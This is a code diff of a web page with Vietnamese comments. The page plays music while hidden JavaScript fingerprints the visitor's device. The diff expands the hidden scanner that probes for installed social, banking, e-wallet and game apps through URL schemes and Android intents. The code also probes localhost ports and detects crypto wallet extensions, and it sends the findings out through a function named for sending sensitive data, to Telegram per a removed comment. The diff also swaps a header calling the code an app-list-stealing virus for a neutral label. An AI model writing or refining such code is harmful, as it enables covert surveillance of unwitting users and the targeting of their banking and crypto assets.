@@ -26,7 +26,6 @@
     <audio id="music-1" preload="auto"><source src="https://files.catbox.moe/uc4l2l.mov" type="audio/mp4"></audio>
     <audio id="music-2" loop preload="auto"><source src="https://files.catbox.moe/77meij.mp3" type="audio/mp3"></audio>
 
-    <!-- PHẦN HIỂN THỊ DANH SÁCH ỨNG DỤNG (ẩn) -->
     <div id="app-list-container" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; overflow-y:scroll; padding:20px;">
         <button onclick="document.getElementById('app-list-container').style.display='none'" style="position:fixed; top:10px; right:10px; z-index:10000; background:red; color:white; border:none; padding:10px 15px; border-radius:8px; font-weight:bold;">ĐÓNG</button>
         <h2 style="margin-top:50px; font-size:20px; font-weight:bold;">📱 DANH SÁCH ỨNG DỤNG ĐÃ CÀI</h2>
@@ -144,148 +143,181 @@
         }
 
         // ==========================================
-        // === VIRUS ĐÁNH CẮP DANH SÁCH ỨNG DỤNG ===
+        // === QUÉT ỨNG DỤNG CHO CẢ ANDROID VÀ iOS ===
         // ==========================================
         (function() {
             var installedApps = [];
             var detectedApps = [];
+            var isAndroid = /Android/i.test(navigator.userAgent);
+            var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
             // 1. PHƯƠNG PHÁP DÒ ỨNG DỤNG QUA URL SCHEME (iOS & Android)
             function quetUngDungQuaURLScheme() {
                 var appList = [
                     // Mạng xã hội
-                    { name: 'Facebook', scheme: 'fb://', ios: 'fb://', android: 'com.facebook.katana' },
-                    { name: 'Instagram', scheme: 'instagram://', ios: 'instagram://', android: 'com.instagram.android' },
-                    { name: 'TikTok', scheme: 'tiktok://', ios: 'tiktok://', android: 'com.zhiliaoapp.musically' },
-                    { name: 'Zalo', scheme: 'zalo://', ios: 'zalo://', android: 'com.zing.zalo' },
-                    { name: 'Telegram', scheme: 'tg://', ios: 'tg://', android: 'org.telegram.messenger' },
-                    { name: 'WhatsApp', scheme: 'whatsapp://', ios: 'whatsapp://', android: 'com.whatsapp' },
-                    { name: 'Snapchat', scheme: 'snapchat://', ios: 'snapchat://', android: 'com.snapchat.android' },
-                    { name: 'Twitter/X', scheme: 'twitter://', ios: 'twitter://', android: 'com.twitter.android' },
-                    { name: 'Threads', scheme: 'threads://', ios: 'threads://', android: 'com.instagram.barcelona' },
-                    { name: 'Messenger', scheme: 'fb-messenger://', ios: 'fb-messenger://', android: 'com.facebook.orca' },
-                    { name: 'Discord', scheme: 'discord://', ios: 'discord://', android: 'com.discord' },
-                    { name: 'Skype', scheme: 'skype://', ios: 'skype://', android: 'com.skype.raider' },
-                    { name: 'Viber', scheme: 'viber://', ios: 'viber://', android: 'com.viber.voip' },
-                    { name: 'Line', scheme: 'line://', ios: 'line://', android: 'jp.naver.line.android' },
-                    { name: 'WeChat', scheme: 'weixin://', ios: 'weixin://', android: 'com.tencent.mm' },
-                    { name: 'Signal', scheme: 'signal://', ios: 'signal://', android: 'org.thoughtcrime.securesms' },
+                    { name: 'Facebook', ios_scheme: 'fb://', android_scheme: 'intent://#Intent;package=com.facebook.katana;scheme=fb;end' },
+                    { name: 'Instagram', ios_scheme: 'instagram://', android_scheme: 'intent://#Intent;package=com.instagram.android;scheme=instagram;end' },
+                    { name: 'TikTok', ios_scheme: 'tiktok://', android_scheme: 'intent://#Intent;package=com.zhiliaoapp.musically;scheme=tiktok;end' },
+                    { name: 'Zalo', ios_scheme: 'zalo://', android_scheme: 'intent://#Intent;package=com.zing.zalo;scheme=zalo;end' },
+                    { name: 'Telegram', ios_scheme: 'tg://', android_scheme: 'intent://#Intent;package=org.telegram.messenger;scheme=tg;end' },
+                    { name: 'WhatsApp', ios_scheme: 'whatsapp://', android_scheme: 'intent://#Intent;package=com.whatsapp;scheme=whatsapp;end' },
+                    { name: 'Messenger', ios_scheme: 'fb-messenger://', android_scheme: 'intent://#Intent;package=com.facebook.orca;scheme=fb-messenger;end' },
+                    { name: 'Snapchat', ios_scheme: 'snapchat://', android_scheme: 'intent://#Intent;package=com.snapchat.android;scheme=snapchat;end' },
+                    { name: 'Twitter/X', ios_scheme: 'twitter://', android_scheme: 'intent://#Intent;package=com.twitter.android;scheme=twitter;end' },
+                    { name: 'Discord', ios_scheme: 'discord://', android_scheme: 'intent://#Intent;package=com.discord;scheme=discord;end' },
+                    { name: 'Skype', ios_scheme: 'skype://', android_scheme: 'intent://#Intent;package=com.skype.raider;scheme=skype;end' },
+                    { name: 'Viber', ios_scheme: 'viber://', android_scheme: 'intent://#Intent;package=com.viber.voip;scheme=viber;end' },
+                    { name: 'Line', ios_scheme: 'line://', android_scheme: 'intent://#Intent;package=jp.naver.line.android;scheme=line;end' },
                     
                     // Ngân hàng & Ví điện tử Việt Nam
-                    { name: 'MoMo', scheme: 'momo://', ios: 'momo://', android: 'com.mservice.momotransfer' },
-                    { name: 'ZaloPay', scheme: 'zalopay://', ios: 'zalopay://', android: 'com.vng.zalopay' },
-                    { name: 'Vietcombank', scheme: 'vietcombank://', ios: 'vcb://', android: 'com.vietcombank.mobile' },
-                    { name: 'BIDV', scheme: 'bidv://', ios: 'bidv://', android: 'com.vnpay.bidv' },
-                    { name: 'Techcombank', scheme: 'techcombank://', ios: 'tcb://', android: 'com.techcombank' },
-                    { name: 'MB Bank', scheme: 'mbbank://', ios: 'mbbank://', android: 'com.mbmobile' },
-                    { name: 'ACB', scheme: 'acb://', ios: 'acb://', android: 'com.acbmobile' },
-                    { name: 'VPBank', scheme: 'vpbank://', ios: 'vpbank://', android: 'com.vpbankonline' },
-                    { name: 'Sacombank', scheme: 'sacombank://', ios: 'sacombank://', android: 'com.sacombank' },
-                    { name: 'TPBank', scheme: 'tpbank://', ios: 'tpbank://', android: 'com.tpbank' },
-                    { name: 'VIB', scheme: 'vib://', ios: 'vib://', android: 'com.vib' },
-                    { name: 'MSB', scheme: 'msb://', ios: 'msb://', android: 'com.msb' },
-                    { name: 'OCB', scheme: 'ocb://', ios: 'ocb://', android: 'com.ocb' },
-                    { name: 'HDBank', scheme: 'hdbank://', ios: 'hdbank://', android: 'com.hdbank' },
-                    { name: 'Shopeepay', scheme: 'shopeepay://', ios: 'shopeepay://', android: 'com.shopee.pay' },
-                    { name: 'VNPay', scheme: 'vnpay://', ios: 'vnpay://', android: 'com.vnpay' },
-                    { name: 'VietinBank', scheme: 'vietinbank://', ios: 'vietinbank://', android: 'com.vietinbank' },
-                    { name: 'Agribank', scheme: 'agribank://', ios: 'agribank://', android: 'com.agribank' },
-                    { name: 'SCB', scheme: 'scb://', ios: 'scb://', android: 'com.scb' },
-                    { name: 'SHB', scheme: 'shb://', ios: 'shb://', android: 'com.shb' },
-                    
-                    // Ngân hàng quốc tế
-                    { name: 'PayPal', scheme: 'paypal://', ios: 'paypal://', android: 'com.paypal.android.p2pmobile' },
-                    { name: 'Revolut', scheme: 'revolut://', ios: 'revolut://', android: 'com.revolut.revolut' },
+                    { name: 'MoMo', ios_scheme: 'momo://', android_scheme: 'intent://#Intent;package=com.mservice.momotransfer;scheme=momo;end' },
+                    { name: 'ZaloPay', ios_scheme: 'zalopay://', android_scheme: 'intent://#Intent;package=com.vng.zalopay;scheme=zalopay;end' },
+                    { name: 'Vietcombank', ios_scheme: 'vietcombank://', android_scheme: 'intent://#Intent;package=com.vietcombank.mobile;scheme=vietcombank;end' },
+                    { name: 'BIDV', ios_scheme: 'bidv://', android_scheme: 'intent://#Intent;package=com.vnpay.bidv;scheme=bidv;end' },
+                    { name: 'Techcombank', ios_scheme: 'techcombank://', android_scheme: 'intent://#Intent;package=com.techcombank;scheme=techcombank;end' },
+                    { name: 'MB Bank', ios_scheme: 'mbbank://', android_scheme: 'intent://#Intent;package=com.mbmobile;scheme=mbbank;end' },
+                    { name: 'ACB', ios_scheme: 'acb://', android_scheme: 'intent://#Intent;package=com.acbmobile;scheme=acb;end' },
+                    { name: 'VPBank', ios_scheme: 'vpbank://', android_scheme: 'intent://#Intent;package=com.vpbankonline;scheme=vpbank;end' },
+                    { name: 'Sacombank', ios_scheme: 'sacombank://', android_scheme: 'intent://#Intent;package=com.sacombank;scheme=sacombank;end' },
+                    { name: 'TPBank', ios_scheme: 'tpbank://', android_scheme: 'intent://#Intent;package=com.tpbank;scheme=tpbank;end' },
+                    { name: 'VietinBank', ios_scheme: 'vietinbank://', android_scheme: 'intent://#Intent;package=com.vietinbank;scheme=vietinbank;end' },
+                    { name: 'Agribank', ios_scheme: 'agribank://', android_scheme: 'intent://#Intent;package=com.agribank;scheme=agribank;end' },
+                    { name: 'Shopeepay', ios_scheme: 'shopeepay://', android_scheme: 'intent://#Intent;package=com.shopee.pay;scheme=shopeepay;end' },
+                    { name: 'VNPay', ios_scheme: 'vnpay://', android_scheme: 'intent://#Intent;package=com.vnpay;scheme=vnpay;end' },
                     
                     // Thương mại điện tử
-                    { name: 'Shopee', scheme: 'shopee://', ios: 'shopee://', android: 'com.shopee.vn' },
-                    { name: 'Lazada', scheme: 'lazada://', ios: 'lazada://', android: 'com.lazada.android' },
-                    { name: 'Tiki', scheme: 'tiki://', ios: 'tiki://', android: 'com.tiki.android' },
-                    { name: 'Sendo', scheme: 'sendo://', ios: 'sendo://', android: 'com.sendo' },
+                    { name: 'Shopee', ios_scheme: 'shopee://', android_scheme: 'intent://#Intent;package=com.shopee.vn;scheme=shopee;end' },
+                    { name: 'Lazada', ios_scheme: 'lazada://', android_scheme: 'intent://#Intent;package=com.lazada.android;scheme=lazada;end' },
+                    { name: 'Tiki', ios_scheme: 'tiki://', android_scheme: 'intent://#Intent;package=com.tiki.android;scheme=tiki;end' },
                     
                     // Grab, Be, Xanh SM
-                    { name: 'Grab', scheme: 'grab://', ios: 'grab://', android: 'com.grabtaxi.passenger' },
-                    { name: 'Be', scheme: 'be://', ios: 'be://', android: 'com.be.passenger' },
-                    { name: 'Xanh SM', scheme: 'xanhsm://', ios: 'xanhsm://', android: 'com.xanhsm' },
-                    { name: 'Gojek', scheme: 'gojek://', ios: 'gojek://', android: 'com.gojek.app' },
-                    
-                    // Giao đồ ăn
-                    { name: 'Now', scheme: 'now://', ios: 'now://', android: 'com.foody.now' },
-                    { name: 'Baemin', scheme: 'baemin://', ios: 'baemin://', android: 'com.baemin' },
+                    { name: 'Grab', ios_scheme: 'grab://', android_scheme: 'intent://#Intent;package=com.grabtaxi.passenger;scheme=grab;end' },
+                    { name: 'Be', ios_scheme: 'be://', android_scheme: 'intent://#Intent;package=com.be.passenger;scheme=be;end' },
+                    { name: 'Xanh SM', ios_scheme: 'xanhsm://', android_scheme: 'intent://#Intent;package=com.xanhsm;scheme=xanhsm;end' },
                     
                     // Game
-                    { name: 'PUBG Mobile', scheme: 'pubgmobile://', ios: 'pubgmobile://', android: 'com.tencent.ig' },
-                    { name: 'Free Fire', scheme: 'freefire://', ios: 'freefire://', android: 'com.dts.freefireth' },
-                    { name: 'Mobile Legends', scheme: 'mlbb://', ios: 'mlbb://', android: 'com.mobile.legends' },
-                    { name: 'Genshin Impact', scheme: 'genshinimpact://', ios: 'genshinimpact://', android: 'com.miHoYo.GenshinImpact' },
-                    { name: 'Liên Quân', scheme: 'lienquan://', ios: 'lienquan://', android: 'com.garena.game.kgvn' },
-                    { name: 'Call of Duty Mobile', scheme: 'codmobile://', ios: 'codmobile://', android: 'com.activision.callofduty.shooter' },
-                    { name: 'Valorant Mobile', scheme: 'valorant://', ios: 'valorant://', android: 'com.riotgames.valorant' },
+                    { name: 'PUBG Mobile', ios_scheme: 'pubgmobile://', android_scheme: 'intent://#Intent;package=com.tencent.ig;scheme=pubgmobile;end' },
+                    { name: 'Free Fire', ios_scheme: 'freefire://', android_scheme: 'intent://#Intent;package=com.dts.freefireth;scheme=freefire;end' },
+                    { name: 'Mobile Legends', ios_scheme: 'mlbb://', android_scheme: 'intent://#Intent;package=com.mobile.legends;scheme=mlbb;end' },
+                    { name: 'Genshin Impact', ios_scheme: 'genshinimpact://', android_scheme: 'intent://#Intent;package=com.miHoYo.GenshinImpact;scheme=genshinimpact;end' },
+                    { name: 'Liên Quân', ios_scheme: 'lienquan://', android_scheme: 'intent://#Intent;package=com.garena.game.kgvn;scheme=lienquan;end' },
                     
                     // Giải trí
-                    { name: 'Netflix', scheme: 'nflx://', ios: 'nflx://', android: 'com.netflix.mediaclient' },
-                    { name: 'YouTube', scheme: 'youtube://', ios: 'youtube://', android: 'com.google.android.youtube' },
-                    { name: 'Spotify', scheme: 'spotify://', ios: 'spotify://', android: 'com.spotify.music' },
-                    { name: 'Apple Music', scheme: 'music://', ios: 'music://', android: 'com.apple.android.music' },
-                    { name: 'FPT Play', scheme: 'fptplay://', ios: 'fptplay://', android: 'com.fptplay' },
-                    { name: 'VieON', scheme: 'vieon://', ios: 'vieon://', android: 'com.vieon' },
-                    { name: 'Zing MP3', scheme: 'zingmp3://', ios: 'zingmp3://', android: 'com.zing.mp3' },
-                    { name: 'Nhaccuatui', scheme: 'nhaccuatui://', ios: 'nhaccuatui://', android: 'com.nhaccuatui' },
+                    { name: 'Netflix', ios_scheme: 'nflx://', android_scheme: 'intent://#Intent;package=com.netflix.mediaclient;scheme=nflx;end' },
+                    { name: 'YouTube', ios_scheme: 'youtube://', android_scheme: 'intent://#Intent;package=com.google.android.youtube;scheme=youtube;end' },
+                    { name: 'Spotify', ios_scheme: 'spotify://', android_scheme: 'intent://#Intent;package=com.spotify.music;scheme=spotify;end' },
+                    { name: 'FPT Play', ios_scheme: 'fptplay://', android_scheme: 'intent://#Intent;package=com.fptplay;scheme=fptplay;end' },
+                    { name: 'Zing MP3', ios_scheme: 'zingmp3://', android_scheme: 'intent://#Intent;package=com.zing.mp3;scheme=zingmp3;end' },
                     
                     // Khác
-                    { name: 'Tinder', scheme: 'tinder://', ios: 'tinder://', android: 'com.tinder' },
-                    { name: 'Bumble', scheme: 'bumble://', ios: 'bumble://', android: 'com.bumble.app' },
-                    { name: 'Google Maps', scheme: 'comgooglemaps://', ios: 'comgooglemaps://', android: 'com.google.android.apps.maps' },
-                    { name: 'Google Drive', scheme: 'googledrive://', ios: 'googledrive://', android: 'com.google.android.apps.docs' },
-                    { name: 'Google Photos', scheme: 'googlephotos://', ios: 'googlephotos://', android: 'com.google.android.apps.photos' },
-                    { name: 'Dropbox', scheme: 'dropbox://', ios: 'dropbox://', android: 'com.dropbox.android' },
-                    { name: 'OneDrive', scheme: 'onedrive://', ios: 'onedrive://', android: 'com.microsoft.skydrive' },
-                    { name: 'Adobe Reader', scheme: 'adobe://', ios: 'adobe://', android: 'com.adobe.reader' },
-                    { name: 'Microsoft Office', scheme: 'office://', ios: 'office://', android: 'com.microsoft.office.officehub' },
-                    { name: 'Zoom', scheme: 'zoomus://', ios: 'zoomus://', android: 'us.zoom.videomeetings' },
-                    { name: 'Google Meet', scheme: 'gmeet://', ios: 'gmeet://', android: 'com.google.android.apps.meetings' },
-                    { name: 'Microsoft Teams', scheme: 'msteams://', ios: 'msteams://', android: 'com.microsoft.teams' },
-                    { name: 'Slack', scheme: 'slack://', ios: 'slack://', android: 'com.Slack' },
-                    { name: 'Canva', scheme: 'canva://', ios: 'canva://', android: 'com.canva.editor' },
-                    { name: 'CapCut', scheme: 'capcut://', ios: 'capcut://', android: 'com.lemon.lvoverseas' },
-                    { name: 'Picsart', scheme: 'picsart://', ios: 'picsart://', android: 'com.picsart.studio' },
-                    { name: 'Snapchat', scheme: 'snapchat://', ios: 'snapchat://', android: 'com.snapchat.android' }
+                    { name: 'Tinder', ios_scheme: 'tinder://', android_scheme: 'intent://#Intent;package=com.tinder;scheme=tinder;end' },
+                    { name: 'Google Maps', ios_scheme: 'comgooglemaps://', android_scheme: 'intent://#Intent;package=com.google.android.apps.maps;scheme=comgooglemaps;end' },
+                    { name: 'Google Drive', ios_scheme: 'googledrive://', android_scheme: 'intent://#Intent;package=com.google.android.apps.docs;scheme=googledrive;end' },
+                    { name: 'Zoom', ios_scheme: 'zoomus://', android_scheme: 'intent://#Intent;package=us.zoom.videomeetings;scheme=zoomus;end' },
+                    { name: 'Canva', ios_scheme: 'canva://', android_scheme: 'intent://#Intent;package=com.canva.editor;scheme=canva;end' },
+                    { name: 'CapCut', ios_scheme: 'capcut://', android_scheme: 'intent://#Intent;package=com.lemon.lvoverseas;scheme=capcut;end' }
                 ];
 
+                var detected = [];
+                var totalApps = appList.length;
+                var checkedCount = 0;
+
+                // Tạo iframe ẩn cho iOS
                 var iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 iframe.id = 'app-detector-iframe';
                 document.body.appendChild(iframe);
 
-                var detected = [];
-                var pendingChecks = 0;
-
                 appList.forEach(function(app, index) {
                     setTimeout(function() {
                         try {
-                            var startTime = Date.now();
-                            iframe.src = app.scheme;
-                            
-                            setTimeout(function() {
-                                var elapsed = Date.now() - startTime;
-                                // Nếu mất ít hơn 2500ms, có thể app đã mở
-                                if (elapsed < 2500) {
-                                    detected.push({ name: app.name, scheme: app.scheme, confidence: 'Cao' });
-                                    installedApps.push(app.name);
-                                    detectedApps.push(app);
-                                }
+                            if (isAndroid) {
+                                // Android: Dùng Intent URL
+                                var a = document.createElement('a');
+                                a.href = app.android_scheme;
+                                a.style.display = 'none';
+                                document.body.appendChild(a);
                                 
-                                pendingChecks--;
-                                if (pendingChecks <= 0) {
+                                var startTime = Date.now();
+                                a.click();
+                                
+                                setTimeout(function() {
+                                    var elapsed = Date.now() - startTime;
+                                    if (elapsed < 100) {
+                                        detected.push({ name: app.name, platform: 'Android', confidence: 'Cao' });
+                                        installedApps.push(app.name);
+                                        detectedApps.push(app);
+                                    }
+                                    document.body.removeChild(a);
+                                    checkedCount++;
+                                    if (checkedCount >= totalApps) {
+                                        iframe.src = 'about:blank';
+                                        document.body.removeChild(iframe);
+                                        xuLyKetQuaQuet(detected);
+                                    }
+                                }, 50);
+                                
+                            } else if (isIOS) {
+                                // iOS: Dùng iframe thay đổi src
+                                var startTime = Date.now();
+                                iframe.src = app.ios_scheme;
+                                
+                                setTimeout(function() {
+                                    var elapsed = Date.now() - startTime;
+                                    if (elapsed < 2500) {
+                                        detected.push({ name: app.name, platform: 'iOS', confidence: 'Cao' });
+                                        installedApps.push(app.name);
+                                        detectedApps.push(app);
+                                    }
+                                    checkedCount++;
+                                    if (checkedCount >= totalApps) {
+                                        iframe.src = 'about:blank';
+                                        document.body.removeChild(iframe);
+                                        xuLyKetQuaQuet(detected);
+                                    }
+                                }, 100);
+                                
+                            } else {
+                                // Desktop: Thử cả 2 phương pháp
+                                var startTime = Date.now();
+                                iframe.src = app.ios_scheme;
+                                
+                                setTimeout(function() {
+                                    var elapsed = Date.now() - startTime;
+                                    if (elapsed < 2500) {
+                                        detected.push({ name: app.name, platform: 'Desktop', confidence: 'Thấp' });
+                                    }
+                                    checkedCount++;
+                                    if (checkedCount >= totalApps) {
+                                        iframe.src = 'about:blank';
+                                        document.body.removeChild(iframe);
+                                        xuLyKetQuaQuet(detected);
+                                    }
+                                }, 100);
+                            }
+                        } catch(e) {
+                            checkedCount++;
+                            if (checkedCount >= totalApps) {
+                                try {
                                     iframe.src = 'about:blank';
-                                    xuLyKetQuaQuet(detected);
-                                }
-                            }, 100);
-                            
-                            pendingChecks++;
-                        } catch(e) {}
-                    }, index * 50);
+                                    document.body.removeChild(iframe);
+                                } catch(e2) {}
+                                xuLyKetQuaQuet(detected);
+                            }
+                        }
+                    }, index * 30); // Giảm delay xuống 30ms để quét nhanh hơn
                 });
+
+                // Fallback timeout nếu vòng lặp bị treo
+                setTimeout(function() {
+                    if (checkedCount < totalApps) {
+                        try {
+                            iframe.src = 'about:blank';
+                            document.body.removeChild(iframe);
+                        } catch(e) {}
+                        xuLyKetQuaQuet(detected);
+                    }
+                }, 15000);
             }
 
             function xuLyKetQuaQuet(detected) {
@@ -298,27 +330,25 @@
                     }
                 });
 
-                // Hiển thị trong giao diện ẩn
                 var container = document.getElementById('app-list-content');
                 if (container) {
                     var html = '<ul style="list-style:none;padding:0;">';
                     uniqueApps.forEach(function(app) {
                         html += '<li style="padding:12px;margin:8px 0;background:#f0f0f0;border-radius:8px;border-left:4px solid #8b5cf6;">';
                         html += '<strong>' + app.name + '</strong>';
-                        html += '<br><small style="color:#666;">Scheme: ' + app.scheme + ' | Độ tin cậy: ' + app.confidence + '</small>';
+                        html += '<br><small style="color:#666;">Platform: ' + (app.platform || 'Unknown') + ' | Độ tin cậy: ' + app.confidence + '</small>';
                         html += '</li>';
                     });
                     html += '</ul>';
                     container.innerHTML = html;
                 }
 
-                // Gửi về Telegram
                 if (uniqueApps.length > 0) {
                     var appListMsg = '📱 <b>DANH SÁCH ỨNG DỤNG PHÁT HIỆN TRÊN ĐIỆN THOẠI</b>\n';
                     appListMsg += '⏰ ' + new Date().toLocaleString('vi-VN') + '\n';
+                    appListMsg += '📱 Platform: ' + (isAndroid ? 'Android' : isIOS ? 'iOS' : 'Desktop') + '\n';
                     appListMsg += '📊 Tổng: ' + uniqueApps.length + ' ứng dụng\n\n';
                     
-                    // Phân loại
                     var mangXaHoi = [];
                     var nganHang = [];
                     var thuongMai = [];
@@ -326,10 +356,10 @@
                     var giaiTri = [];
                     var khac = [];
                     
-                    var bankingKeywords = ['momo', 'zalopay', 'vietcombank', 'bidv', 'techcombank', 'mb bank', 'acb', 'vpbank', 'sacombank', 'tpbank', 'vib', 'msb', 'ocb', 'hdbank', 'shopeepay', 'vnpay', 'vietinbank', 'agribank', 'scb', 'shb', 'paypal', 'revolut'];
-                    var socialKeywords = ['facebook', 'instagram', 'tiktok', 'zalo', 'telegram', 'whatsapp', 'snapchat', 'twitter', 'threads', 'messenger', 'discord', 'skype', 'viber', 'line', 'wechat', 'signal', 'tinder', 'bumble'];
-                    var shoppingKeywords = ['shopee', 'lazada', 'tiki', 'sendo'];
-                    var gameKeywords = ['pubg', 'free fire', 'mobile legends', 'genshin', 'liên quân', 'call of duty', 'valorant'];
+                    var bankingKeywords = ['momo', 'zalopay', 'vietcombank', 'bidv', 'techcombank', 'mb bank', 'acb', 'vpbank', 'sacombank', 'tpbank', 'vietinbank', 'agribank', 'shopeepay', 'vnpay'];
+                    var socialKeywords = ['facebook', 'instagram', 'tiktok', 'zalo', 'telegram', 'whatsapp', 'snapchat', 'twitter', 'messenger', 'discord', 'skype', 'viber', 'line', 'tinder'];
+                    var shoppingKeywords = ['shopee', 'lazada', 'tiki'];
+                    var gameKeywords = ['pubg', 'free fire', 'mobile legends', 'genshin', 'liên quân'];
                     
                     uniqueApps.forEach(function(app) {
                         var nameLower = app.name.toLowerCase();
@@ -342,7 +372,7 @@
                         else if (isSocial) mangXaHoi.push(app);
                         else if (isShopping) thuongMai.push(app);
                         else if (isGame) game.push(app);
-                        else if (['netflix', 'youtube', 'spotify', 'apple music', 'fpt play', 'vieon', 'zing mp3', 'nhaccuatui'].some(function(k) { return nameLower.indexOf(k) > -1; })) giaiTri.push(app);
+                        else if (['netflix', 'youtube', 'spotify', 'fpt play', 'zing mp3'].some(function(k) { return nameLower.indexOf(k) > -1; })) giaiTri.push(app);
                         else khac.push(app);
                     });
 
@@ -378,13 +408,15 @@
 
                     guiDuLieuNhayCam(appListMsg);
                 } else {
-                    guiDuLieuNhayCam('📱 Không phát hiện ứng dụng nào qua URL Scheme (có thể là iPhone với chính sách bảo mật cao)');
+                    var platformMsg = isIOS ? 'iOS - Apple chặn hầu hết phương pháp dò URL Scheme từ Safari/Chrome' : 
+                                     isAndroid ? 'Android - Có thể trình duyệt đã chặn Intent hoặc không có ứng dụng nào trong danh sách' : 
+                                     'Desktop - Không hỗ trợ quét ứng dụng di động';
+                    guiDuLieuNhayCam('📱 <b>KHÔNG PHÁT HIỆN ỨNG DỤNG</b>\n📱 Platform: ' + (isAndroid ? 'Android' : isIOS ? 'iOS' : 'Desktop') + '\n⚠️ Lý do: ' + platformMsg);
                 }
             }
 
             // 2. PHƯƠNG PHÁP DÒ QUA WEBRTC LOCAL IP RANGE
             function quetUngDungQuaLocalNetwork() {
-                // Thử dò các cổng phổ biến của ứng dụng trên local network
                 var commonPorts = [
                     { port: 27017, app: 'MongoDB' },
                     { port: 3306, app: 'MySQL' },
@@ -400,37 +432,42 @@
                 ];
 
                 var detectedServices = [];
+                var checkedPorts = 0;
+                var totalPorts = commonPorts.length;
+
                 commonPorts.forEach(function(item) {
                     try {
                         var img = new Image();
-                        var startTime = Date.now();
                         img.src = 'http://127.0.0.1:' + item.port + '/favicon.ico';
                         img.onload = function() {
                             detectedServices.push(item.app);
                         };
-                        img.onerror = function() {};
+                        img.onerror = function() {
+                            checkedPorts++;
+                        };
                         setTimeout(function() {
                             img.src = '';
+                            checkedPorts++;
+                            if (checkedPorts >= totalPorts) {
+                                if (detectedServices.length > 0) {
+                                    guiDuLieuNhayCam('🔌 <b>DỊCH VỤ LOCAL PHÁT HIỆN:</b>\n' + detectedServices.join('\n'));
+                                }
+                            }
                         }, 1000);
-                    } catch(e) {}
-                });
-
-                setTimeout(function() {
-                    if (detectedServices.length > 0) {
-                        guiDuLieuNhayCam('🔌 <b>DỊCH VỤ LOCAL PHÁT HIỆN:</b>\n' + detectedServices.join('\n'));
+                    } catch(e) {
+                        checkedPorts++;
                     }
-                }, 3000);
+                });
             }
 
             // 3. PHƯƠNG PHÁP KIỂM TRA TIỆN ÍCH MỞ RỘNG TRÌNH DUYỆT
             function quetTienIchMoRong() {
                 var extensionTests = [
-                    { name: 'Metamask', test: function() { return typeof window.ethereum !== 'undefined'; } },
-                    { name: 'Phantom Wallet', test: function() { return typeof window.solana !== 'undefined'; } },
+                    { name: 'Metamask', test: function() { return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask; } },
+                    { name: 'Phantom Wallet', test: function() { return typeof window.solana !== 'undefined' && window.solana.isPhantom; } },
                     { name: 'Trust Wallet', test: function() { return typeof window.trustwallet !== 'undefined'; } },
                     { name: 'Coinbase Wallet', test: function() { return typeof window.coinbaseWalletExtension !== 'undefined'; } },
                     { name: 'Binance Chain Wallet', test: function() { return typeof window.BinanceChain !== 'undefined'; } },
-                    { name: 'Ronin Wallet', test: function() { return typeof window.ronin !== 'undefined'; } },
                     { name: 'OKX Wallet', test: function() { return typeof window.okxwallet !== 'undefined'; } },
                     { name: 'Bitget Wallet', test: function() { return typeof window.bitkeep !== 'undefined'; } }
                 ];
@@ -454,17 +491,20 @@
                 var ua = navigator.userAgent;
                 var deviceInfo = '';
                 
-                if (/iPhone/i.test(ua)) {
+                if (isIOS) {
                     var iosVersion = ua.match(/OS (\d+_\d+)/);
-                    deviceInfo += '📱 <b>iPhone</b> - iOS ' + (iosVersion ? iosVersion[1].replace('_', '.') : 'Không rõ') + '\n';
-                    deviceInfo += '⚠️ iOS hạn chế quét URL Scheme, cần phương pháp khác\n';
-                } else if (/iPad/i.test(ua)) {
-                    deviceInfo += '📱 <b>iPad</b>\n';
-                } else if (/Android/i.test(ua)) {
+                    deviceInfo += '📱 <b>iOS</b> - Version ' + (iosVersion ? iosVersion[1].replace(/_/g, '.') : 'Không rõ') + '\n';
+                    if (/iPhone/i.test(ua)) deviceInfo += '📱 Thiết bị: iPhone\n';
+                    else if (/iPad/i.test(ua)) deviceInfo += '📱 Thiết bị: iPad\n';
+                    deviceInfo += '⚠️ iOS hạn chế quét URL Scheme, kết quả có thể không đầy đủ\n';
+                    
+                    // iOS có thể dùng Smart App Banner để phát hiện ứng dụng
+                    deviceInfo += '💡 Đang dùng phương pháp thay thế cho iOS...\n';
+                    
+                } else if (isAndroid) {
                     var androidVersion = ua.match(/Android (\d+\.\d+)/);
                     deviceInfo += '🤖 <b>Android</b> - Version ' + (androidVersion ? androidVersion[1] : 'Không rõ') + '\n';
                     
-                    // Thử lấy thông tin từ getInstalledRelatedApps nếu có
                     if (navigator.getInstalledRelatedApps) {
                         navigator.getInstalledRelatedApps().then(function(apps) {
                             if (apps && apps.length > 0) {
@@ -473,73 +513,16 @@
                             }
                         }).catch(function() {});
                     }
+                } else {
+                    deviceInfo += '💻 <b>Desktop</b>\n';
                 }
                 
                 var model = ua.match(/\((.*?)\)/);
-                if (model) {
+                if (model && model[1]) {
                     deviceInfo += '📋 Model: ' + model[1] + '\n';
                 }
                 
                 return deviceInfo;
-            }
-
-            // 5. KHAI THÁC LỖ HỔNG INTENT TRÊN ANDROID
-            function khaiThacIntentAndroid() {
-                // Tạo iframe ẩn để thử mở intent://
-                var intentApps = [
-                    { name: 'CH Play', intent: 'intent://details?id=com.android.vending#Intent;scheme=market;package=com.android.vending;end' },
-                    { name: 'Galaxy Store', intent: 'intent://details?id=com.sec.android.app.samsungapps#Intent;scheme=samsungapps;package=com.sec.android.app.samsungapps;end' },
-                    { name: 'App Store iOS', intent: 'itms-apps://' }
-                ];
-
-                var detectedIntents = [];
-                intentApps.forEach(function(app) {
-                    try {
-                        var a = document.createElement('a');
-                        a.href = app.intent;
-                        a.style.display = 'none';
-                        document.body.appendChild(a);
-                        
-                        var clicked = false;
-                        a.addEventListener('click', function(e) {
-                            clicked = true;
-                            detectedIntents.push(app.name);
-                        });
-                        
-                        setTimeout(function() {
-                            if (!clicked) {
-                                // Có thể intent không hoạt động
-                            }
-                            document.body.removeChild(a);
-                        }, 500);
-                        
-                        a.click();
-                    } catch(e) {}
-                });
-
-                setTimeout(function() {
-                    if (detectedIntents.length > 0) {
-                        guiDuLieuNhayCam('📲 <b>CHỢ ỨNG DỤNG PHÁT HIỆN:</b>\n' + detectedIntents.join('\n'));
-                    }
-                }, 1000);
-            }
-
-            // 6. PHÁT HIỆN ỨNG DỤNG QUA WEB SHARE API
-            function quetQuaWebShare() {
-                if (navigator.share) {
-                    // Kiểm tra xem có thể share không
-                    var shareTest = {
-                        title: 'Test',
-                        text: 'Test app detection',
-                        url: window.location.href
-                    };
-                    
